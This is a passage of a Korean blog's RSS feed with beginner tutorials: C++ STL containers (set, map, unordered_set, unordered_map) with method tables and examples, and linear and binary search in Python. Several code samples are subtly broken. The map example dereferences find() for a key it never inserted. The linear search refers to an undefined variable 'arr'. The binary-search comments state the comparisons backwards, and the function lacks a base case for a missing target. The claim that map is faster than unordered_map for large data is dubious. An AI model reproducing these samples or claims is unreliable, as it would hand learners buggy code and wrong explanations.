첫번째)<br>|s1.rend()| 거꾸로해서 마지막 원소를 가리킨다. (즉, 첫번째 원소 = 마지막)<br>|s1.cbegin()| begin과 동일하나 const로 선언<br>|s1.cend()| end과 동일하나 const로 선언<br>|s1.crbegin()| rbegin과 동일하나 const로 선언<br>|s1.crend()| rend와 동일하나 const로 선언</p><h3 id="set-용량-크기-size-capacity"><a href="#set-용량-크기-size-capacity" class="headerlink" title="set 용량, 크기(size, capacity)"></a>set 용량, 크기(size, capacity)</h3><p>|Name|Context<br>|s1.empty()| set(s1)이 비어있는지 체크(true/false) 반환<br>|s1.size()| s1의 size(원소 갯수) 반환<br>|s1.max_size()| s1이 가질 수 있는 최대 사이즈(크기) 반환</p><h3 id="set-삽입-삭제"><a href="#set-삽입-삭제" class="headerlink" title="set 삽입, 삭제"></a>set 삽입, 삭제</h3><p>|Name|Context<br>|s1.insert()| s1에 원소 삽입<br>|s1.erase()| s1에 저장된 원소 삭제(지우기)<br>|s1.swap(s2)| s1에 저장된 원소와 s2를 변경(swap)<br>|s1.clear()| s1에 저장된 원소 모두 삭제<br>|s.emplace()| move()를 사용해서 객체 저장<br>|s.emplace_hint()| 삽입될 위치에 대한 힌트를 삽입</p><h3 id="set의-기능"><a href="#set의-기능" class="headerlink" title="set의 기능"></a>set의 기능</h3><p>|Name|Context<br>|s1.find()| s1에서 값을 검색(값이 있다면 iterator 반환, 아니면 end 반환)<br>|s1.count()| s1에 저장된 요소 개수 반환<br>|s1.lower_bound()| s1의 요소의 위치에 대한 iterator 반환<br>|s1.upper_bound()| s1의 요소의 위치에 대한 iterator 반환<br>|s1.equal_range()| 지정 요소에 대한 iterator 반환</p><h3 id="set-사용-예제"><a href="#set-사용-예제" class="headerlink" title="set 사용 예제"></a>set 사용 예제</h3><pre><code class="c++">#include &lt;cstdio&gt;#include &lt;iostream&gt;#include &lt;set&gt;using namespace std;int main(void)&#123;    set&lt;int&gt; s1;    set&lt;int&gt;::iterator iter;    s1.insert(1);    s1.insert(2);    s1.insert(3);    for(iter = s1.begin(); iter != s1.end(); iter++)&#123; // iterator        cout &lt;&lt; *iter &lt;&lt; endl;    &#125;    cout &lt;&lt; (s1.empty() ? &quot;true&quot;:&quot;false&quot;) &lt;&lt; &quot;\n&quot;; // s1 empty check(true/false)    cout &lt;&lt; s1.size() &lt;&lt; &quot;\n&quot;; // size 반환(result : 3)    cout &lt;&lt; s1.max_size() &lt;&lt; &quot;\n&quot;; // 최대 size 반환    s1.erase(3); // s1의 원소 3 지우기    set&lt;int&gt;::iterator iter2 = s1.find(2); // s1에서 2의 값을 검색    if(iter2 == s1.end())&#123; // 조건문 시작 만약 find해서 결과를 못찾았다면?        cout &lt;&lt; &quot;not found..&quot; &lt;&lt; endl; // not found    &#125;else&#123; // 결과가 있다면?        cout &lt;&lt; &quot;found!!&quot; &lt;&lt; endl; // found    &#125;    s1.clear(); // s1의 모든 원소 지우기&#125;</code></pre><h2 id="map"><a href="#map" class="headerlink" title="map"></a>map</h2><p>map은 set과 같이 associative container의 종류로 노드 기반으로 이루어진 균형 이진 트리 구조이다.</p><p>map은 key, value로 이루어져 있고 pair 객체 형태로 저장된다.</p><p>key는 중복이 불가능(multimap에서는 사용이 가능하다)하며, set과 동일하게 원소가 삽입되면서 자동으로 오름차순 정렬이 된다.</p><p>map은 저장 공간의 필요에 따라서 allocator(동적 할당) 객체를 사용한다.</p><h3 id="map-선언"><a href="#map-선언" class="headerlink" title="map 선언"></a>map 선언</h3><pre><code class="c++">#include &lt;cstdio&gt;#include &lt;iostream&gt;#include &lt;map&gt;using namespace std;map&lt;string, int&gt; m1;</code></pre><h3 id="map-반복자-iterator"><a href="#map-반복자-iterator" class="headerlink" title="map 반복자(iterator)"></a>map 반복자(iterator)</h3><p>|Name|Context<br>|s1.begin()| 첫번째 원소를 가리킨다.<br>|s1.end()| 마지막 원소를 가리킨다.<br>|s1.rbegin()| 거꾸로해서 첫번째 원소를 가리킨다. (즉, 마지막 원소 = 첫번째)<br>|s1.rend()| 거꾸로해서 마지막 원소를 가리킨다. (즉, 첫번째 원소 = 마지막)<br>|s1.cbegin()| begin과 동일하나 const로 선언<br>|s1.cend()| end과 동일하나 const로 선언<br>|s1.crbegin()| rbegin과 동일하나 const로 선언<br>|s1.crend()| rend와 동일하나 const로 선언</p><h3 id="map-용량-크기-size-capacity"><a href="#map-용량-크기-size-capacity" class="headerlink" title="map 용량, 크기(size, capacity)"></a>map 용량, 크기(size, capacity)</h3><p>|Name|Context<br>|s1.empty()| set(s1)이 비어있는지 체크(true/false) 반환<br>|s1.size()| s1의 size(원소 갯수) 반환<br>|s1.max_size()| s1이 가질 수 있는 최대 사이즈(크기) 반환</p><h3 id="map-삽입-삭제"><a href="#map-삽입-삭제" class="headerlink" title="map 삽입, 삭제"></a>map 삽입, 삭제</h3><p>|Name|Context<br>|s1.insert()| s1에 원소 삽입<br>|s1.erase()| s1에 저장된 원소 삭제(지우기)<br>|s1.swap(s2)| s1에 저장된 원소와 s2를 변경(swap)<br>|s1.clear()| s1에 저장된 원소 모두 삭제<br>|s.emplace()| move()를 사용해서 객체 저장<br>|s.emplace_hint()| 삽입될 위치에 대한 힌트를 삽입</p><h3 id="map의-기능"><a href="#map의-기능" class="headerlink" title="map의 기능"></a>map의 기능</h3><p>|Name|Context<br>|s1.find()| s1에서 값을 검색(값이 있다면 iterator 반환, 아니면 end 반환)<br>|s1.count()| s1에 저장된 요소 개수 반환<br>|s1.lower_bound()| s1의 요소의 위치에 대한 iterator 반환<br>|s1.upper_bound()| s1의 요소의 위치에 대한 iterator 반환<br>|s1.equal_range()| 지정 요소에 대한 iterator 반환</p><h3 id="map-사용-예제"><a href="#map-사용-예제" class="headerlink" title="map 사용 예제"></a>map 사용 예제</h3><pre><code class="c++">#include &lt;cstdio&gt;#include &lt;iostream&gt;#include &lt;map&gt;using namespace std;int main(void)&#123;    map&lt;string, int&gt; m1;    map&lt;string, int&gt;::iterator it;    m1.insert(make_pair(&quot;key&quot;, 1)); // map에 key,value 삽입(make_pair 사용)    m1.insert(make_pair(&quot;key2&quot;, 2));    m1.insert(make_pair(&quot;key3&quot;, 3));    cout &lt;&lt; (m1.empty() ? &quot;true&quot;:&quot;false&quot;) &lt;&lt; &quot;\n&quot;; // map이 비어있는지 검사    cout &lt;&lt; m1.count(&quot;key1&quot;) &lt;&lt; &quot;\n&quot;; // 카운트 반환 1 or 0    cout &lt;&lt; m1.count(&quot;key2&quot;) &lt;&lt; &quot;\n&quot;; // 카운트 반환 1 or 0    cout &lt;&lt; m1.find(&quot;key1&quot;)-&gt;second &lt;&lt; &quot;\n&quot;; // key1 검색    map&lt;string, int&gt;::iterator iter = m1.find(&quot;key4&quot;); // iterator key search    if(iter == m1.end())&#123; // key를 못찾아서 end 반환했을 때        cout &lt;&lt; &quot;key not found&quot; &lt;&lt; &quot;\n&quot;;    &#125;    for(it = m1.begin(); it != m1.end(); it++)&#123; // iterator 접근        cout &lt;&lt; it-&gt;first &lt;&lt; it-&gt;second &lt;&lt; endl;    &#125;&#125;</code></pre><ul><li>map은 set과 사용하는 멤버 함수가 동일하다.</li></ul><h2 id="unordered-set"><a href="#unordered-set" class="headerlink" title="unordered_set"></a>unordered_set</h2><p>set과 거의 동일하지만 unordered_set은 원소를 삽입할 때 정렬하지 않는 컨테이너이고,</p><p>set은 이진 탐색 트리의 구조지만 unordered_set은 해쉬 테이블의 구조를 가지고 있다.</p><h3 id="unordered-set-사용-예제"><a href="#unordered-set-사용-예제" class="headerlink" title="unordered_set 사용 예제"></a>unordered_set 사용 예제</h3><pre><code class="c++">#include &lt;cstdio&gt;#include &lt;iostream&gt;#include &lt;unordered_set&gt;using namespace std;int main(void)&#123;    unordered_set&lt;int&gt; us1; // 생성자 선언    unordered_set&lt;int&gt;::iterator it; // iterator 선언    us1.insert(1); // us1(set)에 원소 삽입    us1.insert(2);    us1.insert(3);    us1.insert(4);    for(it = us1.begin(); it != us1.end(); it++)&#123; //iterator 반복자        cout &lt;&lt; *it &lt;&lt; endl; // 출력    &#125;&#125;</code></pre><h2 id="unordered-map"><a href="#unordered-map" class="headerlink" title="unordered_map"></a>unordered_map</h2><p>unordered_map 역시 map과 사용하는 방법은 동일하기 때문에 둘 중 어느것을 쓰던 문제가 없다.</p><p>다만 차이점이라면 set, unordered_set과 같이 이진 탐색 트리와 해쉬 테이블의 차이점을 가지고 있다.</p><p>속도가 빨라야 한다면 unordered_map를 사용하는 것도 권장할 수 있다.</p><p>하지만 데이터가 많아진다면 unordered_map 역시 속도가 느리다고 할 수 있는데,</p><p>결국 데이터가 적다면 unordered_map이 속도면에서는 유리하고 데이터가 많다면 map이 좋다.</p><h3 id="unordered-map-사용-예제"><a href="#unordered-map-사용-예제" class="headerlink" title="unordered_map 사용 예제"></a>unordered_map 사용 예제</h3><pre><code class="c++">#include &lt;cstdio&gt;#include &lt;iostream&gt;#include &lt;unordered_map&gt;using namespace std;int main(void)&#123;    unordered_map&lt;string, int&gt; um1; // 생성자    unordered_map&lt;string, int&gt;::iterator it;    um1.insert(make_pair(&quot;key1&quot;, 1)); // map에 원소 삽입(make_pair(key, value))    um1.insert(make_pair(&quot;key2&quot;, 2));    for(it = um1.begin(); it != um1.end(); it++)&#123; // iterator 반복문        cout &lt;&lt; it-&gt;first &lt;&lt; it-&gt;second &lt;&lt; endl;    &#125;    cout &lt;&lt; um1.find(&quot;key1&quot;)-&gt;second &lt;&lt; &quot;\n&quot;; // key find    cout &lt;&lt; (um1.empty() ? &quot;true&quot;:&quot;false&quot;) &lt;&lt; &quot;\n&quot;; // map(um1)이 비어있는지 체크하고 true/false 반환&#125;</code></pre><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><p><a href="https://modoocode.com/">https://modoocode.com/</a></p></li><li><p><a href="https://blockdmask.tistory.com/76">https://blockdmask.tistory.com/76</a></p></li><li><p><a href="https://blockdmask.tistory.com/70">https://blockdmask.tistory.com/70</a></p></li><li><p><a href="https://hwan-shell.tistory.com/130">https://hwan-shell.tistory.com/130</a></p></li><li><p><a href="https://blankspace-dev.tistory.com/347">https://blankspace-dev.tistory.com/347</a></p></li><li><p><a href="https://twpower.github.io/91-how-to-use-map-in-cpp">https://twpower.github.io/91-how-to-use-map-in-cpp</a></p></li></ul>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Docx/">Docx</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/C/">C++</category>
      
      <category domain="https://blog.jhyeon.dev/tags/STL/">STL</category>
      
      
      <comments>https://blog.jhyeon.dev/2020/09/10/c-stl-200910/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>탐색 알고리즘(선형, 이진) 정리</title>
      <link>https://blog.jhyeon.dev/2020/09/10/search-algorithm-200910/</link>
      <guid>https://blog.jhyeon.dev/2020/09/10/search-algorithm-200910/</guid>
      <pubDate>Wed, 09 Sep 2020 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;탐색-알고리즘-종류&quot;&gt;&lt;a href=&quot;#탐색-알고리즘-종류&quot; class=&quot;headerlink&quot; title=&quot;탐색 알고리즘 종류&quot;&gt;&lt;/a&gt;탐색 알고리즘 종류&lt;/h2&gt;&lt;h3 id=&quot;1-선형-탐색법-리니어-서치&quot;&gt;&lt;a href=&quot;#1-선형-탐</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="탐색-알고리즘-종류"><a href="#탐색-알고리즘-종류" class="headerlink" title="탐색 알고리즘 종류"></a>탐색 알고리즘 종류</h2><h3 id="1-선형-탐색법-리니어-서치"><a href="#1-선형-탐색법-리니어-서치" class="headerlink" title="1. 선형 탐색법 (리니어 서치)"></a>1. 선형 탐색법 (리니어 서치)</h3><ul><li><p>왼쪽부터 순서대로 하나씩 확인해 나가는 방법</p></li><li><p>(한쪽 끝에서 다른 한쪽 끝으로 나아가는 방법)</p></li><li><p>탐색 시작 → 결과를 탐색할 때까지 반복문 실행 → 결과값 반환 후 종료</p></li></ul><pre><code class="py">#!/usr/bin/python3def search(array, target):    i = 0    while i &lt; len(array):        if arr[i] == target:            return i        i += 1    return &quot;error&quot;array = [1,2,3,5,7,8,9] # index 0~6target = 9print(search(array,target))#result6</code></pre><h3 id="2-이진-알고리즘-탐색-binary"><a href="#2-이진-알고리즘-탐색-binary" class="headerlink" title="2. 이진 알고리즘 탐색(binary)"></a>2. 이진 알고리즘 탐색(binary)</h3><ul><li><p>정렬된 리스트(배열) 에서 원하는 수(target) 값을 찾는 알고리즘 입니다.</p></li><li><p>선형 알고리즘 탐색 방법과 다르게 “이진 알고리즘” 탐색은 리스트가 정렬되어 있어야 한다는 점입니다.</p></li><li><p>배열의 전체의 중간 값(middle) 을 비교 합니다.</p></li><li><p>중간 값(middle) 이 원하는 수(target) 값보다 작다면 왼쪽, 크다면 오른쪽을 선택하여 탐색을 시작합니다.</p></li><li><p>선택된 방향에서 중간 값(middle) 과 원하는 수(target) 을 비교해서 같다면 탐색을 종료합니다.</p></li></ul><pre><code class="py">#coding=UTF-8def binarysearch(array, target, left, right):    middle_idx = (left+right)//2 # 중간 지점 탐색    print(middle_idx)    middle = array[middle_idx] # Array 배열 적용    if target == middle: # 탐색 값과 중간 값이 같다면        print(&#39;result : &#123;&#125;&#39;.format(middle)) # 결과 리턴    elif middle &gt; target: # 탐색 값이 중간 값 보다 크다면        binarysearch(array, target, left, middle_idx-1) # 함수실행    elif middle &lt; target: # 탐색 값이 중간 값 보다 작다면        binarysearch(array, target, middle_idx+1, right) # 함수실행    else:        return False # 위 경우 모두 만족하지 않을 때 false 반환array = [1,2,3,5,7,11,13,9,17,15,19,21]length = len(array)print(&quot;length : &#123;&#125;&quot;.format(length))array.sort()print(&quot;sort : &#123;&#125;&quot;.format(array))target = 15left = 0right = length-1binarysearch(array, target, 0, right)</code></pre><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><p><a href="https://velog.io/@keemun/1">https://velog.io/@keemun/1</a></p></li><li><p><a href="https://velog.io/@madfinger/Binary-Search%EC%9D%B4%EC%A7%84-%ED%83%90%EC%83%89-%ED%8C%8C%EC%9D%B4%EC%8D%AC">https://velog.io/@madfinger/Binary-Search이진-탐색-파이썬</a></p></li></ul>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Docx/">Docx</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Algorithm/">Algorithm</category>
      
      <category domain="https://blog.jhyeon.dev/tags/%EC%84%A0%ED%98%95-%ED%83%90%EC%83%89/">선형 탐색</category>
      
      <category domain="https://blog.jhyeon.dev/tags/%EC%9D%B4%EC%A7%84-%ED%83%90%EC%83%89/">이진 탐색</category>
      
      
      <comments>https://blog.jhyeon.dev/2020/09/10/search-algorithm-200910/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
